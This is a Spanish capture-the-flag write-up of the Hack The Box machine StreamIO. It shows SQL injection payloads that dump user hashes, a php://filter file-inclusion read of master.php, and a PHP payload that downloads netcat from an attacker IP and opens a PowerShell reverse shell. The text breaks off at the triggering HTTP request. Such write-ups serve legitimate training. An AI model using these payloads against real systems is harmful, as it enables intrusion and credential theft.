___
Tags: #medium #htb #SQLI #WriteOwner #firefox #SMBcompartido
___
# StreamIO

## Información General

**- Dificultad:** Medium <br>
**- Sistema operativo:** Windows <br>
**- Fecha de resolución:** 18/08/2026 <br>
**- Enlace:** [StreamIO](https://app.hackthebox.com/machines/StreamIO)

## Usuarios/grupos identificados

| Usuario / entidad        | ¿Cómo se obtiene?                                       | Papel en la cadena                                   | Resultado                                       |
| ------------------------ | ------------------------------------------------------- | ---------------------------------------------------- | ----------------------------------------------- |
| **Yoshihide**            | SQL Injection → hashes → recuperación de contraseña     | Primera cuenta válida para el acceso a la aplicación | Permite acceder al panel `/admin`               |
| **nikk37**               | RCE mediante LFI en `debug`                             | Usuario bajo cuyo contexto se obtiene la shell       | Permite continuar la enumeración del sistema    |
| **JDgodd**               | Credenciales recuperadas del perfil Firefox de `nikk37` | Punto de partida de la escalada en Active Directory  | Permite atacar las relaciones de permisos de AD |
| **Core Staff** _(grupo)_ | BloodHound muestra `WriteOwner` desde `JDgodd`          | Grupo que `JDgodd` consigue controlar                | `JDgodd` puede añadirse al grupo                |
| **Administrator**        | `Core Staff` permite `ReadLAPSPassword`                 | Cuenta administrativa final                          | Se obtiene la contraseña y acceso por WinRM     |
## Listado de Vulnerabilidades Identificadas

### 1. SQL Injection (SQLi)

**Descripción:** El parámetro de búsqueda de `search.php` permite introducir código SQL manipulado. El informe demuestra que es posible enumerar bases de datos, tablas, columnas y extraer información de la tabla `users`.

**Impacto:** Permite obtener usuarios y hashes de contraseñas, facilitando el acceso a cuentas válidas y el avance de la intrusión.

### 2. LFI (Local File Inclusion)

**Descripción:** El parámetro `debug` del panel administrativo permite acceder a archivos del servidor, como `master.php`, mediante una inclusión de archivos.

**Impacto:** Permite leer código fuente y descubrir información sensible y funcionalidades vulnerables de la aplicación.

### 3. Remote Code Execution (RCE)

**Descripción:** El código de `master.php` utiliza `file_get_contents()` junto con `eval()`, permitiendo ejecutar contenido controlado por el atacante como código PHP.

**Impacto:** Permite ejecutar comandos en el sistema operativo y obtener una shell sobre la máquina víctima.

### 4. Exposición de credenciales

**Descripción:** Durante la enumeración del servidor se encuentran credenciales de la base de datos `streamio_backup` dentro de archivos de la aplicación.

**Impacto:** Permite acceder a la base de datos de backup y obtener nuevas credenciales de usuarios.

### 5. Credenciales almacenadas en Firefox

**Descripción:** El usuario `nikk37` dispone de un perfil de Firefox que contiene `logins.json` y `key4.db`, archivos utilizados para almacenar y proteger credenciales.

**Impacto:** Al tener acceso al perfil, se pueden recuperar credenciales adicionales, entre ellas las correspondientes a `JDgodd`, permitiendo continuar con la escalada de privilegios.

### 6. Permiso `WriteOwner` excesivo en Active Directory

**Descripción:** BloodHound identifica que `JDgodd` dispone de `WriteOwner` sobre el grupo `Core Staff`. Este permiso permite modificar el propietario del grupo y posteriormente obtener control sobre él.

**Impacto:** `JDgodd` puede incorporarse a `Core Staff` y adquirir los privilegios asociados a dicho grupo.

### 7. Permiso `ReadLAPSPassword`

**Descripción:** El grupo `Core Staff` dispone de permisos para leer la contraseña LAPS del controlador de dominio.

**Impacto:** Permite obtener la contraseña del administrador local del controlador de dominio y, finalmente, acceder como `Administrator`.

### Cadena resumida

**SQLi → LFI → RCE → exposición de credenciales → credenciales de Firefox → `WriteOwner` → `ReadLAPSPassword` → `Administrator`.**

## Reconocimiento

**HTB** nos proporciona la ip de la máquina objetivo **10.129.51.170**

### Ping

```
ping -c 1 10.129.51.170
```

<p align="center">
<img src="images/ping.png" width="600" alt="Resultado de Nmap">
</p>

**Su ttl es 128. Por tanto es Window**

### Escaneo de puertos abiertos

#### Escaneo de puerto TCP

El comando que uso con nmap es:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -Pn 10.129.51.170
```

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-17 16:57:27Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_ssl-date: 2026-08-17T16:59:29+00:00; +6h59m59s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
54956/tcp open  msrpc         Microsoft Windows RPC
```

| Open port/TCP | Service       | Version                                 |
| ------------- | ------------- | --------------------------------------- |
| 53            | domain        | Simple DNS Plus                         |
| 80            | http          | Microsoft IIS httpd 10.0                |
| 88            | kerberos-sec  | Microsoft Windows Kerberos              |
| 135           | msrpc         | Microsoft Windows RPC                   |
| 139           | netbios-ssn   | Microsoft Windows netbios-ssn           |
| 443           | ssl/https?    | -                                       |
| 445           | microsoft-ds? | -                                       |
| 464           | kpasswd5?     | -                                       |
| 593           | ncacn_http    | Microsoft Windows RPC over HTTP 1.0     |
| 636           | tcpwrapped    | -                                       |
| 3268          | ldap          | Microsoft Windows Active Directory LDAP |
| 3269          | tcpwrapped    | -                                       |

Basado en la versión IIS de 80, es probable que el servidor esté ejecutando Windows 10 o Server 2016 o versiones más recientes.

La combinación de servicios (DNS 53, Kerberos 88, LDAP 389 y otros, SMB 445, RPC 135, Netbios 139, y otros) sugiere que se trata de un controlador de dominio.

También hay dos nombres de dominio en el certificado TLS en el puerto 443: `streamIO.htb` y `watch.streamIO.htb` . Los añadiré a mi archivo `/etc/hosts` .

Dado que están activos los puertos 80 y 443, definitivamente los incluiré en mi análisis, junto con el puerto 445 (SMB).

### SMB

El siguiente comando **extrae los nombres de dominio/host de la IP vía SMB y los agrega automáticamente a tu archivo `/etc/hosts`** para que puedas navegar o atacar usando sus nombres de dominio.

```
sudo netexec smb 10129.51.170 --generate-hosts-file /etc/hosts
```

> 10.129.51.170     DC.streamIO.htb streamIO.htb DC watch.streamIO.htb 

Además hemos añadido **watch.streamIO.htb** ya que aparece en nuestro escaneo con **nmap** 

El usuario **guest** esta deshabilitado.

```
netexec smb 10.129.51.170 -u guest -p ''
```

<p align="center">
<img src="images/guest.png" width="600" alt="Resultado de Nmap">
</p>

### Transferencia de zona

No sirvió la transferencia de zona :(

```
dig axfr streamIO.htb @10.129.51.170
```

Una búsqueda inversa tampoco proporciona información útil.

```
dig -x 10.129.51.170 @10.129.51.170
```

### streamio.htb - TCP 443

Lo más destacable de la pagina, es que te dirige a un **login**, a un formulario de **contacta con nosotros** y en **About us** aparece tres nombres.

<p align="center">
<img src="images/streamio.png" width="600" alt="Resultado de Nmap">
</p>

**Login**:

Este login permite registrarme.

<p align="center">
<img src="images/register.png" width="600" alt="Resultado de Nmap">
</p>

**Register**:

Aunque registre un nuevo usuario con éxito, a la hora de loguearme no me lo acepta :/

<p align="center">
<img src="images/register-1.png" width="600" alt="Resultado de Nmap">
</p>

**Contact us**:

<p align="center">
<img src="images/formulario.png" width="600" alt="Resultado de Nmap">
</p>

**About us**: 

<p align="center">
<img src="images/aboutus.png" width="600" alt="Resultado de Nmap">
</p>

- **Barry**
- **Oliver**
- **Samantha**

### watch.streamIO.htb

El sitio web incluye una sección de preguntas frecuentes y un formulario de suscripción. Al añadir un correo electrónico a través de este formulario, se confirma que funciona.

<p align="center">
<img src="images/watchStreamIO.png" width="600" alt="Resultado de Nmap">
</p>

```
StreamIO ofrece servicios para transmitir películas en línea en nuestra plataforma.

Vea todas las mejores películas en definición UHD sin retrasos.

¿Desea recibir actualizaciones sobre nuevos estrenos de películas?

Déjenos su correo electrónico para agregarlo a la lista de suscripción.

Preguntas frecuentes

¿Dónde puedo ver esto?

Este sitio web está disponible tanto para dispositivos móviles como para computadoras de escritorio. Las aplicaciones para diferentes plataformas aún no están disponibles, pero se está trabajando en ellas.

¿Puedo obtener todas las películas más recientes aquí?

Sí. Todas las películas más recientes están disponibles aquí para usted. También ofrecemos películas clásicas como "El Padrino".

¿Este sitio web es apto para niños?

Tenemos muchas películas premiadas para niños. También ofrecemos una variedad de películas animadas para niños.
```

#### Enumeración watch.streamIO.htb

`feroxbuster` Funciona de la misma manera que para el dominio principal, y encuentra dos páginas adicionales:

```
feroxbuster -u https://watch.streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k
```

> https://watch.streamio.htb/blocked.php
> https://watch.streamio.htb/search.php

#### blocked.php

`blocked.php` muestra que me han bloqueado durante cinco minutos. Habrá que tener cuidado con cualquier actividad que pueda activar un firewall de aplicación web (WAF).

<p align="center">
<img src="images/StreamIObloqueado.png" width="600" alt="Resultado de Nmap">
</p>

#### search.php

`search.php` muestra una lista de cientos de películas con botones de "Ver". Al hacer clic en "Ver", simplemente se indica que la función no está disponible.

<p align="center">
<img src="images/streamiover.png" width="600" alt="Resultado de Nmap">
</p>

Al introducir algo en la barra de búsqueda, se filtran los resultados. Por ejemplo, al introducir "test", se obtienen:

<p align="center">
<img src="images/test.png" width="600" alt="Resultado de Nmap">
</p>

Por lo tanto, claramente está utilizando caracteres comodín tanto en mi entrada como en la respuesta.

## Explotación

### Shell como Yoshihide

#### SQLI

A continuación, voy a enseñar como detectar un **sqli** en esta página, normalmente siempre suele ser lo mismo.

1. **Se rompe la sintaxis con una comilla**

- Si rompe la app (500, mensaje SQL, página en blanco) → confirma SQLi por error-based, y probablemente puedas extraer datos vía mensajes de error.
- Si devuelve **200 OK normal** (como en mi caso) → **NO significa que no sea vulnerable**. Solo significa que:
    - los errores de la base de datos están silenciados/ocultos, o
    - el código usa algo como `mysqli_query($conn, $query) or die()` sin mostrar el error real, o
    - hay manejo de excepciones que devuelve la vista por defecto ante cualquier fallo.

```
q='
```

<p align="center">
<img src="images/StreamIOcomilla.png" width="600" alt="Resultado de Nmap">
</p>

2. **Confirma con par verdadero/falso**

Si el comportamiento **cambia entre estas dos**, está confirmado. Esta es la prueba más fiable porque no depende de mensajes de error.

```
q=' AND 1=1-- -    → resultados normales
```

<p align="center">
<img src="images/streamioand1.png" width="600" alt="Resultado de Nmap">
</p>

```
q=' AND 1=2-- -    → sin resultados / vacío
```

<p align="center">
<img src="images/StreamIOs12.png" width="600" alt="Resultado de Nmap">
</p>

3. Contar columnas:

**Número de columnas confirmado**: **6**

El `UNION SELECT` con 6 valores funcionó sin error, lo que confirma que la consulta original tiene exactamente 6 columnas (coincide con lo que ibas a sacar con `ORDER BY`, pero aquí lo confirmaste directo).

**Columnas "reflejadas" (visibles en la página)**: posiciones 2 y 3

La página solo te muestra el contenido de la **columna 2** (en el campo título) y la **columna 3** (en el campo año).

```
q=aeiou' UNION SELECT 1,2,3,4,5,6;-- -
```

<p align="center">
<img src="images/StreamIOselect.png" width="600" alt="Resultado de Nmap">
</p>

4. Obtención de datos:

- Intentaré obtener la versión de la base de datos. 

**Saber con que tipo de bbdd estamos trabajando es importante porque apartir de ahí podemos adaptar la consulta**

```
q=aeiou' UNION SELECT 1,@@version,3,4,5,6;-- -
```

<p align="center">
<img src="images/StreamIOversion.png" width="600" alt="Resultado de Nmap">
</p>

- Intentaré enumerar los nombres de las bbdd

```
aeiou' UNION SELECT 1,name,3,4,5,6 FROM sys.databases;-- -
```

<p align="center">
<img src="images/StreamIObbdd.png" width="600" alt="Resultado de Nmap">
</p>

- Intentaré enumerar las tablas de la bbdd **StreamIO** 

```
q=aeiou' UNION SELECT 1,TABLE_NAME,3,4,5,6 FROM STREAMIO.INFORMATION_SCHEMA.TABLES;-- -
```

<p align="center">
<img src="images/StreamIOtablas.png" width="600" alt="Resultado de Nmap">
</p>

- Intentaré enumerar las columnas de la tabla **users**

```
q=aeiou' UNION SELECT 1,COLUMN_NAME,3,4,5,6 FROM STREAMIO.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users';-- -
```

<p align="center">
<img src="images/StreamIOtusers.png" width="600" alt="Resultado de Nmap">
</p>

- Intentare concatenar el resultado de la columna **username** y **password**

```
aeiou' UNION SELECT 1,CONCAT(username,':',password),3,4,5,6 FROM STREAMIO.dbo.users;-- -
```

<p align="center">
<img src="images/StreamIOusersandpass.png" width="600" alt="Resultado de Nmap">
</p>

**Listado de usuario, hash y contraseña**

Para descifrar los hash de los usuarios, usaré esta pagina [desecriptar](https://hashes.com/en/decrypt/hash)

- admin:665a50ac9eaa781e4f7f04199db97a11 --> `**paddpadd**`
- Barry:54c88b2dbd7b1a84012fabc1a4c73415 --> `$hadoW`
- Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8 --> `$monique$1991$`
- Clara:ef8f3d30a856cf166fb8215aca93e9ff --> `%$clara`
- Juliette:6dcd87740abb64edfa36d170f0d5450d --> `$3xybitch` 
- Lauren:08344b85b329d7efd611b7a7743e8a09 --> `##123a8j8w5123##`
- Lenord:ee0b8a0937abd60c2882eacb2f8dc49f --> `physics69i`
- Michelle:b83439b16f844bd6ffe35c02fe21b3c0 --> `!?Love?!123`
- Oliver:fd78db29173a5cf701bd69027cb9bf6b --> `aD2%1#pqz`
- Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5 --> `!!sabrina$`
- Thane:3577c47eb1e12c8ba021611e1280753c --> `highschoolmusical`
- Theodore:925e5408ecb67aea449373d668b7359e --> `L3m0n@de`
- Victoria:b22abb47a02b52d5dfa27fb0b534f693 --> `!5psycho8!`
- yoshihide:b779ba15cedfd22a023c4d8bcf5f2332 --> `66boysandgirls..`

Con la contraseña obtenidas de los hashes de los usuarios intento probar si alguno sirve para **smb** ninguno funciona.

```
netexec smb streamIO.htb -u admin -p '**paddpadd**'
netexec smb streamIO.htb -u Barry -p '$hadoW'
netexec smb streamIO.htb -u Bruno -p '$monique$1991$'
netexec smb streamIO.htb -u Clara -p '%$clara'
netexec smb streamIO.htb -u Juliette -p '$3xybitch'
netexec smb streamIO.htb -u Lauren -p '##123a8j8w5123##'
netexec smb streamIO.htb -u Lenord -p 'physics69i'
netexec smb streamIO.htb -u Michelle -p '!?Love?!123'
netexec smb streamIO.htb -u Oliver -p 'aD2%1#pqz'
netexec smb streamIO.htb -u Sabrina -p '!!sabrina$'
netexec smb streamIO.htb -u Thane -p 'highschoolmusical'
netexec smb streamIO.htb -u Theodore -p 'L3m0n@de'
netexec smb streamIO.htb -u Victoria -p '!5psycho8!'
netexec smb streamIO.htb -u yoshihide -p '66boysandgirls..'
```

Recuerdo que teníamos un login, pruebas todas credenciales obtenidas, la única cred que me dio resultado fue **yoshihide**:**66boysandgirls..** A la hora de iniciar observo que tengo un nuevo botón **logout**

<p align="center">
<img src="images/steriyyio.png" width="600" alt="Resultado de Nmap">
</p>

#### Enumeración web 

```
gobuster dir -u https://streamio.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -k -x php
```

>admin
>master.php

Si visitara `/admin` ahora, hay una sencilla página de panel de administración. Cada uno de los enlaces anteriores lleva a la misma URL, pero con un parámetro diferente. Por ejemplo, "Gestión de usuarios" es `https://streamio.htb/admin/?user=` , "Gestión de personal" es `https://streamio.htb/admin/?staff=` , etc.

<p align="center">
<img src="images/staff.png" width="600" alt="Resultado de Nmap">
</p>

Vale la pena explorar para ver si existen otros parámetros además de `user` , `staff` , `movie` y `message` .

```
wfuzz -u 'https://streamio.htb/admin/?FUZZ=' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=ebtdob3tobbvtb81od4okccbs0" --hh 1678
```

>debug

Durante un tiempo investigando me doy cuenta que este parámetro **debug** es vulnerable a **LFI**. Como antes encontré un archivo llamado **master.php** me gustaría leer su contenido:

```
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
```

```
PGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==
```

Si lo traduzco a texto plano, me sale el siguiente código `cat master.php | base64 -d `

```
<h1>Movie managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['movie']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST" action="?movie=">
				<input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>  
```

#### Explicación del master.php

```php
if(isset($_POST['include']))
{
    if($_POST['include'] !== "index.php" ) 
        eval(file_get_contents($_POST['include']));
    else
        echo(" ---- ERROR ---- ");
}
```

Esto es extremadamente peligroso porque:

1. `file_get_contents($_POST['include'])` lee el contenido de **cualquier archivo o URL** que tú controles como parámetro `include`.
2. `eval()` ejecuta ese contenido **como código PHP**.

Es decir: controlas el contenido de un archivo → ese contenido se ejecuta como PHP → **RCE directo**

Solo hay un filtro: que no sea literalmente `"index.php"`. Eso no es una protección real, es trivial de sortear.

#### POC

Paso 1. **Preparo el payload malicioso (rce.php)**

```
system("powershell -c wget 10.10.14.188/nc64.exe -outfile \\programdata\\nc64.exe");
system("\\programdata\\nc64.exe -e powershell 10.10.14.188 4445");
```

Fíjate que **no tiene las etiquetas `<?php ... ?>`** — y eso es intencional y correcto, porque `eval()` en PHP ya asume que el string que le pasas es código PHP puro, sin necesitar las etiquetas de apertura (de hecho si las pusieras podría dar error de sintaxis, dependiendo del contexto).

Este código PHP, cuando se ejecute en el servidor Windows víctima, hace dos cosas usando la función `system()` de PHP (ejecuta comandos del sistema operativo):

1. **Primera línea**: use PowerShell para descargar `nc64.exe` (una versión de Netcat para Windows) desde mi Kali, y lo guarda en `C:\programdata\nc64.exe`.
2. **Segunda línea**: ejecuto ese `nc64.exe` recién descargado, con el flag `-e powershell` (que le dice a Netcat que ejecute una PowerShell y conecte su entrada/salida al socket), apuntando de vuelta a tu Kali por el puerto 4445. Esto es una **reverse shell**.

Paso 2. **Servir los archivos desde mi Kali**

```bash
python3 -m http.server 80
```

Esto convierte tu Kali en un servidor HTTP simple, sirviendo el directorio actual (donde tienes tanto `rce.php` como `nc64.exe`) en el puerto 80. Así, el servidor víctima puede acceder a:

- `http://10.10.14.188/rce.php` → tu payload PHP
- `http://10.10.14.188/nc64.exe` → el binario de Netcat

Paso 3. **Pongo el listener en tu Kali**

```bash
nc -lnvp 4445
```

Esto deja tu Kali **escuchando** en el puerto 4445, esperando a que algo se conecte. Es el destino final de la reverse shell — el punto donde vas a recibir la sesión de PowerShell de la máquina víctima.

Paso 4. **Disparar la cadena con la petición HTTP**

```
POST /admin/?debug=master.php HTTP/2
Host: streamio.htb
Content-Type: application/x-www-form-urlencoded
